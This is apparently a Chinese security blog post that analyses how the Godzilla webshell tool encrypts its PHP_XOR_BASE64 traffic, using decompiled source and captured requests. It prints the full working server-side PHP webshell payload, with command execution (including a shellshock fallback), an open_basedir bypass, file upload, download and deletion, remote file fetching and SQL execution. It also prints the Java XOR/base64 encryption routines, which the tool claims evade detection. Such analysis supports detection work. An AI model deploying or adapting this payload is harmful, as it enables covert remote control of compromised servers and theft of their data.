[哥斯拉Godzilla](https://github.com/BeichenDream/Godzilla)是由[@BeichenDream](https://github.com/BeichenDream)开发的一款优秀的shell权限管理工具，其特点有：

> 1\. 哥斯拉全部类型的shell均过市面所有静态查杀  
> 2\. 哥斯拉流量加密过市面全部流量waf  
> 3\. 哥斯拉的自带的插件是冰蝎、蚁剑不能比拟的

平时在渗透过程中，冰蝎、蚁剑、哥斯拉以及经典的菜刀都会用到，每个工具都有各自的特点。今年在HW中终于体验到了哥斯拉流量加密的强大，菜刀、蚁剑、冰蝎的马刚连上就断，最后只有哥斯拉可以正常连接。当时就有个想法，HW结束后要找时间分析一下哥斯拉的流量加密是怎样实现的。后来一直比较忙，一直到现在，基本上搞明白了哥斯拉是如何做到流量加密的。

# 本文约定

本文使用的是当前最新版本的哥斯拉，版本号为`3.03`

本文主要分析了`php`版的shell流量加密过程，其他语言的shell流量加密过程类似

文中哥斯拉的源码是通过反编译[Godzilla.jar](https://github.com/BeichenDream/Godzilla/releases/download/v3.03-godzilla/Godzilla.jar)得到的，作者并未做代码混淆，所以很方便就能得到源码。反编译得到的源码存储的根目录为`src`。

![image.png](https://image.3001.net/images/20210821/1629526660_61209a84e5c9f89622c42.png!small)

## PHP_XOR_BASE64加密shell分析

### shell设置

首先从本人用的最多的`PHP_XOR_BASE64`类型的加密shell说起，本章节所用的shell主要配置如下：

URL：<http://just.for.test/php_xor_b64.php>

密码：`pass`

密钥：`test1234`

有效载荷：`PhpDynamicPayload`

加密器：`PHP_XOR_BASE64`

哥斯拉的Shell配置包括`基本配置`和`请求配置`。其中`基本配置`主要设置shell地址、密码、密钥、加密器等信息，如下图所示：  
![image.png](https://image.3001.net/images/20210821/1629525522_61209612a58c074388609.png!small)这里要注意`密码`和`密钥`的不同：

`密码`：和蚁剑、菜刀一样，`密码`就是POST请求中的参数名称。例如，在本例中密码为`pass`，那么哥斯拉提交的每个请求都是`pass=xxxxxxxx`这种形式

`密钥`：用于对请求数据进行加密，不过加密过程中并非直接使用`密钥`明文，而是计算`密钥`的md5值，然后取其 **前16位** 用于加密过程

哥斯拉shell的`请求配置`主要用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征。本文在分析过程中，此处未做任何特殊设置。  
![image.png](https://image.3001.net/images/20210821/1629525587_61209653cbbd0211020a0.png!small)

## shell服务器端代码

`PHP_XOR_BASE64`类型的加密shell的服务器端代码如下，其中定义了`encode`函数，用于加密或解密请求数据。由于是通过按位异或实现的加密，所以`encode`函数即可用于加密，同时也可用于解密。  
整个shell的基本执行流程是：服务器接收到哥斯拉发送的第一个请求后，由于此时尚未建立session，所以将POST请求数据解密后（得到的内容为shell操作中所需要用到的相关`php`函数定义代码）存入session中，后续哥斯拉只会提交相关操作对应的函数名称（如获取目录中的文件列表对应的函数为`getFile`）和相关参数，这样哥斯拉的相关操作就不需要发送大量的请求数据。  
![image.png](https://image.3001.net/images/20210821/1629527912_61209f680dbdcf9c86389.png!small)

## shell流量加密过程分析

这里从Shell Setting对话框中的`测试连接`操作开始分析。在Shell
Setting对话框中，设置代理为Burp，然后点击`测试连接`按钮，可以看到一共会产生3个`POST`数据包，POST请求报文中参数名都是`pass`（即shell的连接密码），参数值都是加密数据。  
![image.png](https://image.3001.net/images/20210821/1629529370_6120a51a20329704c8b35.png!small)

### shell请求抓包分析

第1个请求

通过Burp抓包可知，第1个请求会发送大量数据，该请求不含有任何`Cookie`信息，服务器响应报文不含任何数据，但是会设置`PHPSESSID`，后续请求都会自动带上该Cookie。  
![image.png](https://image.3001.net/images/20210821/1629529671_6120a64798497bc880ed3.png!small)

第2个请求

可以看到，第2个请求中已经自动带上了第1个请求中服务器响应返回的`Cookie`值，并且第2个请求中只有少量的数据。  
![image.png](https://image.3001.net/images/20210821/1629529992_6120a788413099615a350.png!small)

第3个请求

第3个请求与第2个请求完全一致。  
![image.png](https://image.3001.net/images/20210821/1629530139_6120a81b8879be89f280a.png!small)

### 代码分析

第1个数据包

Shell
Setting相关代码在`src\core\ui\component\dialog\ShellSetting.java`文件中，其中测试连接按钮相关代码如下：![image.png](https://image.3001.net/images/20210821/1629531175_6120ac27767b0e517f0bb.png!small)点击测试连接按钮时，首先调用`this.updateTempShellEntity()`函数，判断shell基本信息是否填写完整无误，并将shell基本信息更新到上下文环境中。如果shell基本信息填写无误，则调用`this.shellContext.initShellOpertion()`函数进行初始化，在该过程中会发送前两个请求。相关代码在`src\core\shell\ShellEntity.java`文件中，如下所示，其中的关键代码我做了注释：  
![image.png](https://image.3001.net/images/20210821/1629531446_6120ad36e1376f3701b34.png!small)其中，`this.cryptionModel.init(this)`函数源码在`src\shells\cryptions\phpXor\PhpXor.java`文件中（`C#`、`Java`、`PHP`以及不同的加密方式分别对应不同的源文件），相关代码如下：  
![image.png](https://image.3001.net/images/20210821/1629532260_6120b064a8896b41297c2.png!small)在上述`init()`函数中，首先初始化了上下文对象、Http对象、密钥等信息，然后加载`src\shells\payloads\php\assets\payload.php`文件内容作为payload数据（到目前为止，还未进行任何加密操作）。`payload.php`文件内容如下所示，其中定义了shell所有功能所需的一系列函数，哥斯拉第一次连接shell时，将这些函数定义发送给服务器并存储在session中，后续的shell操作只需要发送函数名称以及对应的函数参数即可。

    
    
    $parameters=array();
    $_SES=array();
    function run($pms){
        reDefSystemFunc();
        $_SES=&getSession();
        @session_start();
        $sessioId=md5(session_id());
        if (isset($_SESSION[$sessioId])){
            $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId)));
        }
        @session_write_close();
    
        if (canCallGzipDecode()==1&&@isGzipStream($pms)){
            $pms=gzdecode($pms);
        }
        formatParameter($pms);
    
        if (isset($_SES["bypass_open_basedir"])&&$_SES["bypass_open_basedir"]==true){
            @bypass_open_basedir();
        }
    
        $result=evalFunc();
    
        if ($_SES!==null){
            session_start();
            $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId));
            @session_write_close();
        }
    
        if (canCallGzipEncode()){
            $result=gzencode($result,6);
        }
    
        return $result;
    }
    function S1MiwYYr($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[($i+1)%15];
        }
        return $D;
    }
    function reDefSystemFunc(){
        if (!function_exists("file_get_contents")) {
            function file_get_contents($file) {
                $f = @fopen($file,"rb");
                $contents = false;
                if ($f) {
                    do { $contents .= fgets($f); } while (!feof($f));
                }
                fclose($f);
                return $contents;
            }
        }
        if (!function_exists('gzdecode')&&function_existsEx("gzinflate")) {
            function gzdecode($data)
            {
                return gzinflate(substr($data,10,-8));
            }
        }
    }
    function &getSession(){
        global $_SES;
        return $_SES;
    }
    function bypass_open_basedir(){
        @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
        $allFiles = @scandir($_FILENAME);
        $cdStatus=false;
        if ($allFiles!=null){
            foreach ($allFiles as $fileName) {
                if ($fileName!="."&&$fileName!=".."){
                    if (@is_dir($fileName)){
                        if (@chdir($fileName)===true){
                            $cdStatus=true;
                            break;
                        }
                    }
                }
    
            }
        }
        if(!@file_exists('bypass_open_basedir')&&!$cdStatus){
            @mkdir('bypass_open_basedir');
        }
        if (!$cdStatus){
            @chdir('bypass_open_basedir');
        }
        @ini_set('open_basedir','..');
        @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
        @$_path = str_replace("\\",'/',$_FILENAME);
        @$_num = substr_count($_path,'/') + 1;
        $_i = 0;
        while($_i < $_num){
            @chdir('..');
            $_i++;
        }
        @ini_set('open_basedir','/');
        if (!$cdStatus){
            @rmdir($_FILENAME.'/'.'bypass_open_basedir');
        }
    }
    function formatParameter($pms){
        global $parameters;
        $index=0;
        $key=null;
        while (true){
            $q=$pms[$index];
            if (ord($q)==0x02){
                $len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);
                $index+=4;
                $value=substr($pms,$index+1,$len);
                $index+=$len;
                $parameters[$key]=$value;
                $key=null;
            }else{
                $key.=$q;
            }
            $index++;
            if ($index>strlen($pms)-1){            break;
            }
        }
    }
    function evalFunc(){
        try{
            @session_write_close();
            $className=get("codeName");
            $methodName=get("methodName");
            $_SES=&getSession();
            if ($methodName!=null){
                if (strlen(trim($className))>0){
                    if ($methodName=="includeCode"){
                        return includeCode();
                    }else{
                        if (isset($_SES[$className])){
                            return eval($_SES[$className]);
                        }else{
                            return "{$className} no load";
                        }
                    }
                }else{
                    if (function_exists($methodName)){
                        return $methodName();
                    }else{
                        return "function {$methodName} not exist";
                    }
                }
            }else{
                return "methodName Is Null";
            }
        }catch (Exception $e){
            return "ERROR://".$e -> getMessage();
        }
    
    }
    function deleteDir($p){
        $m=@dir($p);
        while(@$f=$m->read()){
            $pf=$p."/".$f;
            @chmod($pf,0777);
            if((is_dir($pf))&&($f!=".")&&($f!="..")){
                deleteDir($pf);
                @rmdir($pf);
            }else if (is_file($pf)&&($f!=".")&&($f!="..")){
                @unlink($pf);
            }
        }
        $m->close();
        @chmod($p,0777);
        return @rmdir($p);
    }
    function deleteFile(){
        $F=get("fileName");
        if(is_dir($F)){
            return deleteDir($F)?"ok":"fail";
        }else{
            return (file_exists($F)?@unlink($F)?"ok":"fail":"fail");
        }
    }
    function setFileAttr(){
        $type = get("type");
        $attr = get("attr");
        $fileName = get("fileName");
        $ret = "Null";
        if ($type!=null&&$attr!=null&&$fileName!=null) {
            if ($type=="fileBasicAttr"){
                if (@chmod($fileName,convertFilePermissions($attr))){
                    return "ok";
                }else{
                    return "fail";
                }
            }else if ($type=="fileTimeAttr"){
                if (@touch($fileName,$attr)){
                    return "ok";
                }else{
                    return "fail";
                }
            }else{
                return "no ExcuteType";
            }
        }else{
            $ret="type or attr or fileName is null";
        }
        return $ret;
    }
    function fileRemoteDown(){
        $url=get("url");
        $saveFile=get("saveFile");
        if ($url!=null&&$saveFile!=null) {
            $data=@file_get_contents($url);
            if ($data!==false){
                if (@file_put_contents($saveFile,$data)!==false){
                    @chmod($saveFile,0777);
                    return "ok";
                }else{
                    return "write fail";
                }
            }else{
                return "read fail";
            }
        }else{
            return "url or saveFile is null";
        }
    }
    function copyFile(){
        $srcFileName=get("srcFileName");
        $destFileName=get("destFileName");
        if (@is_file($srcFileName)){
            if (copy($srcFileName,$destFileName)){
                return "ok";
            }else{
                return "fail";
            }
        }else{
            return "The target does not exist or is not a file";
        }
    }
    function moveFile(){
        $srcFileName=get("srcFileName");
        $destFileName=get("destFileName");
        if (rename($srcFileName,$destFileName)){
            return "ok";
        }else{
            return "fail";
        }
    
    }
    function getBasicsInfo()
    {
        $data = array();
        $data['OsInfo'] = @php_uname();
        $data['CurrentUser'] = @get_current_user();
        $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) > 0 ? $data['CurrentUser'] : 'NULL';
        $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR'];
        $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT'];
        $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP'];
        $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR'];
        $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME'];
        $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
        $data['disable_functions'] = @ini_get('disable_functions');
        $data['disable_functions'] = strlen(trim($data['disable_functions'])) > 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions');
        $data['Open_basedir'] = @ini_get('open_basedir');
        $data['timezone'] = @ini_get('date.timezone');
        $data['encode'] = @ini_get('exif.encode_unicode');
        $data['extension_dir'] = @ini_get('extension_dir');
        $data['sys_get_temp_dir'] = @sys_get_temp_dir();
        $data['include_path'] = @ini_get('include_path');
        $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT'];
        $data['PHP_SAPI'] = PHP_SAPI;
        $data['PHP_VERSION'] = PHP_VERSION;
        $data['PHP_INT_SIZE'] = PHP_INT_SIZE;
        $data['canCallGzipDecode'] = canCallGzipDecode();
        $data['canCallGzipEncode'] = canCallGzipEncode();
        $data['session_name'] = @ini_get("session.name");
        $data['session_save_path'] = @ini_get("session.save_path");
        $data['session_save_handler'] = @ini_get("session.save_handler");
        $data['session_serialize_handler'] = @ini_get("session.serialize_handler");
        $data['user_ini_filename'] = @ini_get("user_ini.filename");
        $data['memory_limit'] = @ini_get('memory_limit');
        $data['upload_max_filesize'] = @ini_get('upload_max_filesize');
        $data['post_max_size'] = @ini_get('post_max_size');
        $data['max_execution_time'] = @ini_get('max_execution_time');
        $data['max_input_time'] = @ini_get('max_input_time');
        $data['default_socket_timeout'] = @ini_get('default_socket_timeout');
        $data['mygid'] = @getmygid();
        $data['mypid'] = @getmypid();
        $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE'];
        $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
        $data['loaded_extensions'] = @implode(',', @get_loaded_extensions());
        $data['short_open_tag'] = @get_cfg_var('short_open_tag');
        $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false';
        $data['asp_tags'] = @get_cfg_var('asp_tags');
        $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false';
        $data['safe_mode'] = @get_cfg_var('safe_mode');
        $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false';
        $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME']));
        $SCRIPT_FILENAME=@dirname($_SERVER['SCRIPT_FILENAME']);
        $data['FileRoot'] = '';
        if (substr($SCRIPT_FILENAME, 0, 1) != '/') {foreach (range('A', 'Z') as $L){ if (@is_dir("{$L}:")){ $data['FileRoot'] .= "{$L}:/;";}};};
        $data['FileRoot'] = (strlen(trim($data['FileRoot'])) > 0 ? $data['FileRoot'] : '/');
        $data['FileRoot']= substr_count($data['FileRoot'],substr($SCRIPT_FILENAME, 0, 1))<=0?substr($SCRIPT_FILENAME, 0, 1).":/":$data['FileRoot'];
        $result="";
        foreach($data as $key=>$value){
            $result.=$key." : ".$value."\n";
        }
        return $result;
    }
    function getFile(){
        $dir=get('dirName');
        $dir=(strlen(@trim($dir))>0)?trim($dir):str_replace('\\','/',dirname(__FILE__));
        $dir.="/";
        $path=$dir;
        $allFiles = @scandir($path);
        $data="";
        if ($allFiles!=null){
            $data.="ok";
            $data.="\n";
            $data.=$path;
            $data.="\n";
            foreach ($allFiles as $fileName) {
                if ($fileName!="."&&$fileName!=".."){
                    $fullPath = $path.$fileName;
                    $lineData=array();
                    array_push($lineData,$fileName);
                    array_push($lineData,@is_file($fullPath)?"1":"0");
                    array_push($lineData,date("Y-m-d H:i:s", @filemtime($fullPath)));
                    array_push($lineData,@filesize($fullPath));
                    $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":"");
                    array_push($lineData,(strlen($fr)>0?$fr:"F"));
                    $data.=(implode("\t",$lineData)."\n");
                }
    
            }
        }else{
            return "Path Not Found Or No Permission!";
        }
        return $data;
    }
    function readFileContent(){
        $fileName=get("fileName");
        if (@is_file($fileName)){
            if (@is_readable($fileName)){
                return file_get_contents($fileName);
            }else{
                return "No Permission!";
            }
        }else{
            return "File Not Found";
        }
    }
    function uploadFile(){
        $fileName=get("fileName");
        $fileValue=get("fileValue");
        if (@file_put_contents($fileName,$fileValue)!==false){
            @chmod($fileName,0777);
            return "ok";
        }else{
            return "fail";
        }
    }
    function newDir(){
        $dir=get("dirName");
        if (@mkdir($dir,0777,true)!==false){
            return "ok";
        }else{
            return "fail";
        }
    }
    function newFile(){
        $fileName=get("fileName");
        if (@file_put_contents($fileName,"")!==false){
            return "ok";
        }else{
            return "fail";
        }
    }
    
    function function_existsEx($functionName){
        $d=explode(",",@ini_get("disable_functions"));
        if(empty($d)){
            $d=array();
        }else{
            $d=array_map('trim',array_map('strtolower',$d));
        }
        return(function_exists($functionName)&&is_callable($functionName)&&!in_array($functionName,$d));
    }
    
    function execCommand(){
        @ob_start();
        $cmdLine=get("cmdLine");
        $d=__FILE__;
        $cmdLine=substr($d,0,1)=="/"?"-c \"{$cmdLine}\"":"/c \"{$cmdLine}\"";
        if(substr($d,0,1)=="/"){
            @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
        }else{
            @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
        }
        $executeFile=substr($d,0,1)=="/"?"sh":"cmd";
    
        $cmdLine="{$executeFile} {$cmdLine}";
        $cmdLine=$cmdLine." 2>&1";
        $ret=0;
    
        if (!function_exists("runshellshock")){
            function runshellshock($d, $c) {
                if (substr($d, 0, 1) == "/" && function_existsEx('putenv') && (function_existsEx('error_log') || function_existsEx('mail'))) {
                    if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                        $tmp = tempnam(sys_get_temp_dir(), 'as');
                        putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                        if (function_existsEx('error_log')) {
                            error_log("a", 1);
                        } else {
                            mail("a@127.0.0.1", "", "", "-bv");
                        }
                    } else {
                        return False;
                    }
                    $output = @file_get_contents($tmp);
                    @unlink($tmp);
                    if ($output != "") {
                        print($output);
                        return True;
                    }
                }
                return False;
            };
        }
    
        if(function_existsEx('system')){
            @system($cmdLine,$ret);
        }elseif(function_existsEx('passthru')){
            @passthru($cmdLine,$ret);
        }elseif(function_existsEx('shell_exec')){
            print(@shell_exec($cmdLine));
        }elseif(function_existsEx('exec')){
            @exec($cmdLine,$o,$ret);
            print(join("\n",$o));
        }elseif(function_existsEx('popen')){
            $fp=@popen($cmdLine,'r');
            while(!@feof($fp)){
                print(@fgets($fp,2048));
            }
            @pclose($fp);
        }elseif(function_existsEx('proc_open')){
            $p = @proc_open($cmdLine, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
            while(!@feof($io[1])){
                print(@fgets($io[1],2048));
            }
            while(!@feof($io[2])){
                print(@fgets($io[2],2048));
            }
            @fclose($io[1]);
            @fclose($io[2]);
            @proc_close($p);
        }elseif(runshellshock($d, $cmdLine)) {
            print($ret);
        }elseif(substr($d,0,1)!="/" && @class_exists("COM")){
            $w=new COM('WScript.shell');
            $e=$w->exec($cmdLine);
            $so=$e->StdOut();
            print($so->ReadAll());
            $se=$e->StdErr();
            print($se->ReadAll());
        }else{
            return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock is available";
        }
        print(($ret!=0)?"ret={$ret}":"");
        $result = @ob_get_contents();
        @ob_end_clean();
        return $result;
    }
    function execSql(){
        $dbType=get("dbType");
        $dbHost=get("dbHost");
        $dbPort=get("dbPort");
        $username=get("dbUsername");
        $password=get("dbPassword");
        $execType=get("execType");
        $execSql=get("execSql");
        function  mysql_exec($host,$port,$username,$password,$execType,$sql){
            // 创建连接
            $conn = new mysqli($host,$username,$password,"",$port);
            // Check connection
            if ($conn->connect_error) {
                return $conn->connect_error;
            }
    
            $result = $conn->query($sql);
            if ($conn->error){
                return $conn->error;
            }
            $result = $conn->query($sql);
            if ($execType=="update"){
                return "Query OK, "+$conn->affected_rows+" rows affected";
            }else{
                $data="ok\n";
                while ($column = $result->fetch_field()){
                    $data.=base64_encode($column->name)."\t";
                }
                $data.="\n";
                if ($result->num_rows > 0) {
                    // 输出数据
                    while($row = $result->fetch_assoc()) {
                        foreach ($row as $value){
                            $data.=base64_encode($value)."\t";
                        }
                        $data.="\n";
                    }
                }
                return $data;
            }
        }
        function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql){
            try {
                $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password);
    
                // 设置 PDO 错误模式为异常
                $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
                if ($execType=="update"){
                    return "Query OK, "+$conn->exec($sql)+" rows affected";
                }else{
                    $data="ok\n";
                    $stm=$conn->prepare($sql);
                    $stm->execute();
                    $row=$stm->fetch(PDO::FETCH_ASSOC);
                    $_row="\n";
                    foreach (array_keys($row) as $key){
                        $data.=base64_encode($key)."\t";
                        $_row.=base64_encode($row[$key])."\t";
                    }
                    $data.=$_row."\n";
                    while ($row=$stm->fetch(PDO::FETCH_ASSOC)){
                        foreach (array_keys($row) as $key){
                            $data.=base64_encode($row[$key])."\t";
                        }
                        $data.="\n";
                    }
                    return $data;
                }
    
            }
            catch(PDOException $e)
            {
                return $e->getMessage();
            }
        }
        if ($dbType=="mysql"){
            if (extension_loaded("mysqli")){
                return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql);
            }else if (extension_loaded("pdo")){
                return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
            }else{
                return "no extension";
            }
        }else if (extension_loaded("pdo")){
            return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else{
            return "no extension";
        }
        return "no extension";
    
    }
    function base64Encode($data){
        return base64_encode($data);
    }
    function test(){
        return "ok";
    }
    function get($key){
        global $parameters;
        if (isset($parameters[$key])){
            return $parameters[$key];
        }else{
            return null;
        }
    }
    function getAllParameters(){
        global $parameters;
        return $parameters;
    }
    function includeCode(){
        $classCode=get("binCode");
        $codeName=get("codeName");
        $_SES=&getSession();
        $_SES[$codeName]=$classCode;
        return "ok";
    }
    function base64Decode($string){
        return base64_decode($string);
    }
    function convertFilePermissions($fileAttr){
        $mod=0;
        if (strpos($fileAttr,'R')!==false){
            $mod=$mod+0444;
        }
        if (strpos($fileAttr,'W')!==false){
            $mod=$mod+0222;
        }
        if (strpos($fileAttr,'X')!==false){
            $mod=$mod+0111;
        }
        return $mod;
    }
    function close(){
        @session_start();
        $_SES=&getSession();
        $_SES=null;
        if (@session_destroy()){
            return "ok";
        }else{
            return "fail!";
        }
    }
    
    function bigFileDownload(){
        $mode=get("mode");
        $fileName=get("fileName");
        $readByteNum=get("readByteNum");
        $position=get("position");
        if ($mode=="fileSize"){
            if (@is_readable($fileName)){
                return @filesize($fileName)."";
            }else{
                return "not read";
            }
        }elseif ($mode=="read"){
    
            if (function_existsEx("fopen")&&function_existsEx("fread")&&function_existsEx("fseek")){
                $handle=fopen($fileName,"ab+");
                fseek($handle,$position);
                $data=fread($handle,$readByteNum);
                @fclose($handle);
                if ($data!==false){
                    return $data;
                }else{
                    return "cannot read file";
                }
            }else if (function_existsEx("file_get_contents")){
                return file_get_contents($fileName,false,null,$position,$readByteNum);
            }else{
                return "no function";
            }
    
        }else{
            return "no mode";
        }
    }
    
    function bigFileUpload(){
        $fileName=get("fileName");
        $fileContents=get("fileContents");
        $position=get("position");
        if(function_existsEx("fopen")&&function_existsEx("fwrite")&&function_existsEx("fseek")){
            $handle=fopen($fileName,"ab+");
            if ($handle!==false){
                fseek($handle,$position);
                $len=fwrite($handle,$fileContents);
                if ($len!==false){
                    return "ok";
                }else{
                    return "cannot write file";
                }
                @fclose($handle);
            }else{
                return "cannot open file";
            }
        }else if (function_existsEx("file_put_contents")){
            if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){
                return "ok";
            }else{
                return "writer fail";
            }
        }else{
            return "no function";
        }
    }
    function canCallGzipEncode(){
        if (function_existsEx("gzencode")){
            return "1";
        }else{
            return "0";
        }
    }
    function canCallGzipDecode(){
        if (function_existsEx("gzdecode")){
            return "1";
        }else{
            return "0";
        }
    }
    function bytesToInteger($bytes, $position) {
        $val = 0;
        $val = $bytes[$position + 3] & 0xff;
        $val <<= 8;
        $val |= $bytes[$position + 2] & 0xff;
        $val <<= 8;
        $val |= $bytes[$position + 1] & 0xff;
        $val <<= 8;
        $val |= $bytes[$position] & 0xff;
        return $val;
    }
    function isGzipStream($bin){
        if (strlen($bin)>=2){
            $bin=substr($bin,0,2);
            $strInfo = @unpack("C2chars", $bin);
            $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
            switch ($typeCode) {
                case 31139:
                    return true;
                    break;
                default:
                    return false;
            }
        }else{
            return false;
        }
    }
    function getBytes($string) {
        $bytes = array();
        for($i = 0; $i < strlen($string); $i++){
            array_push($bytes,ord($string[$i]));
        }
        return $bytes;
    }
    

然后调用`this.http.sendHttpResponse(this.payload)`函数发送第1个请求。接下来看一下`sendHttpResponse`函数的实现代码，其代码在`src\util\http\Http.java`文件中。该函数经过了几次包装，最终实现代码如下：  
![image.png](https://image.3001.net/images/20210821/1629541942_6120d636567b60c59576d.png!small)由上述代码可知，原始请求数据先后经过编码、左右追加数据（本例中左右追加数据均为空），然后才通过POST请求发送给服务器。接下来看一下编码实现过程，相关代码在`src\shells\cryptions\phpXor\PhpXor.java`文件的`encode`函数中，相关代码如下：

    
    
    public byte[] encode(byte[] data) {
          try {
             return this.E(data);
          } catch (Exception var3) {
             Log.error(var3);
             return null;
          }
    }
    
    public byte[] E(byte[] cs) {
          int len = cs.length;
          // 原始数据与密钥md5值的前16位按位异或
          for(int i = 0; i < len; ++i) {
             cs[i] ^= this.key[i + 1 & 15];
          }
    
          return (this.pass + "=" + URLEncoder.encode(functions.base64Encode(cs))).getBytes();  // 拼接shell密码
    }
    

`encode()`函数最终调用了同一文件中的`E()`函数，最终实现对请求数据的加密。  
综上可知，哥斯拉发送的第一个POST请求中，请求数据的加密过程为：将原始数据（即`src\shells\payloads\php\assets\payload.php`文件）与shell密钥（本例中为`test1234`）md5值的前16位（本例中为`16d7a4fca7442dda`）按位异或，再依次经过`base64`编码和`URL`编码，得到编码数据，最终以`pass=编码数据`的形式作为POST报文请求体，POST到服务器。  
解密过程与加密过程正好相反：从`pass=编码数据`中提取`编码数据`，依次经过`URL`解码和`base64`解码，再与shell密钥（本例中为`test1234`）md5值的前16位（本例中为`16d7a4fca7442dda`）按位异或即可得到原始请求数据。

第2个数据包

第2个POST请求由`this.payloadModel.test()`产生，其实现代码在`src/shells/payloads/php/PhpShell.java`文件中（`C#`、`Java`、`PHP`以及不同的加密方式分别对应不同的源文件），相关代码如下：  
![image.png](https://image.3001.net/images/20210821/1629543352_6120dbb8e136705373402.png!small)由上述代码可知，哥斯发送的第2个POST请求实际上是通过调用`evalFunc((String)null,
"test",
parameter)`函数向服务器POST了原始数据为`methodName=test`的加密包，如果服务器返回值（解密后）为`ok`，则说明shell测试连接成功。  
在`evalFunc`函数中，首先设置POST请求数据，然后调用`praameter.formatEx()`函数将请求数据序列化为字节数组`data`，然后判断目标服务器`gzdecode`函数可正常调用，如果可用则将字节数组`data`进行gzip压缩。然后调用`http.sendHttpResponse(data)`函数将字节数组`data`加密后POST到目标服务器（与第1个请求加密方法相同）。对于服务器返回值，如果返回报文是经过gzip压缩的，则将原始响应数据gzip解压后返回。  
接下来看一下将原始POST请求数据序列化为字节数组的实现过程，`praameter.formatEx()`函数最终调用了`src/util/http/Parameter.java`文件中的`serialize()`，如下所示：  
![image.png](https://image.3001.net/images/20210821/1629544012_6120de4c950af9ce64afc.png!small)举例来说，假设原始POST请求参数为：`{'methodName':
'getFile', 'dirName': 'D:/WWW/shells/'}`，则经过`serialize()`函数转换成字节数组的过程如下图所示：  
![image.png](https://image.3001.net/images/20210821/1629544099_6120dea3d6928ede6c39f.png!small)第3个请求数据和服务器响应数据和第2个请求完全一致，不再赘述。

#### 服务器响应数据解密过程分析

再看一下`test()`函数的执行过程，通过调用`this.evalFunc((String)null, "test",
parameter)`函数得到服务器返回报文字节数组，然后转换成字符串再判断是否为`ok`，说明在`evalFunc`函数执行过程中，已经得到了明文的服务器返回数据，因此服务器返回报文的解密过程肯定是在`evalFunc`函数中。  
在`evalFunc`函数中，通过`byte[] result =
this.http.sendHttpResponse(data).getResult();`获取到服务器响应报文后，最多进行一次gzip解压，因此解密过程肯定是在`this.http.sendHttpResponse(data).getResult()`的调用过程中。  
进一步分析`sendHttpResponse`函数的处理逻辑，最终定位到`src\util\http\HttpResponse.java`文件的`ReadAllData`函数，在该函数中找到解密过程对应的代码，即该函数中最后一行代码。  
![image.png](https://image.3001.net/images/20210821/1629544593_6120e09130337ba24c17d.png!small)`PHP_XOR_BASE64`加密方式对应的`decode`函数实现过程在`src\shells\cryptions\phpXor\PhpXor.java`文件中（`C#`、`Java`、`PHP`以及不同的加密方式分别对应不同的源文件），相关代码如下：

    
    
    public byte[] decode(byte[] data) {
          if (data != null && data.length > 0) {
             try {
                return this.D(this.findStr(data));  // 先删除data左侧附加的混淆字符串，然后调用D函数进行解密
             } catch (Exception var3) {
                Log.error(var3);
                return null;
             }
          } else {
             return data;
          }
    }
    
    public byte[] D(String data) {
          byte[] cs = functions.base64Decode(data);
          int len = cs.length;
          // 原始数据与密钥md5值的前16位按位异或
          for(int i = 0; i < len; ++i) {
             cs[i] ^= this.key[i + 1 & 15];
          }
    
          return cs;
    }
    
    // 删除服务器响应数据报文前后附加混淆字符串
    public String findStr(byte[] respResult) {
          String htmlString = new String(respResult);
          return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }
    

由上述代码可知，服务器响应数据解密过程并不复杂，先调用`findStr`函数删除服务器响应数据左右附加的混淆字符串（对于`PHP_XOR_BASE64`加密方式来说，前后各附加了16位的混淆字符），然后将得到的数据进行`base64`解码，最后再和shell连接密钥md5值的前16位按位异或，即完成响应数据的解密。  
至此，我们已经明白了哥斯拉的`PHP_XOR_BASE64`加密shell，在`测试连接`过程中产生POST请求和响应数据的加密和解密过程。哥斯拉的其他shell功能，除了产生的POST请求内容不同外，数据的加解密过程都是一样的。

进入shell的加密流量分析

